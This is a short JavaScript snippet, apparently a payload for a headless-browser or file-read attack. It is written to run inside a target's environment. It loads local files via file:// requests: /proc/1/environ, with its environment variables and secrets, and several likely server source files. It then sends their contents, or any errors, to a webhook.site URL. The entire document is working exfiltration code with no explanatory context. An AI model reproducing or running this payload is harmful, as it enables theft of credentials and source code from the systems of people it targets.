var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
var files=['/proc/1/environ','/index.js','/app/index.js','/app.js','/server.js'];
files.forEach(function(f){
  var x=new XMLHttpRequest();
  x.onreadystatechange=function(){
    if(x.readyState==4){
      fetch(w+'/X_'+f.replace(/\//g,'_')+'?d='+encodeURIComponent(x.responseText?x.responseText.substring(0,1500):'EMPTY'));
    }
  };
  x.open('GET','file://'+f,true);
  try{x.send()}catch(e){fetch(w+'/X_'+f.replace(/\//g,'_')+'_ERR?d='+encodeURIComponent(e+''))}
});
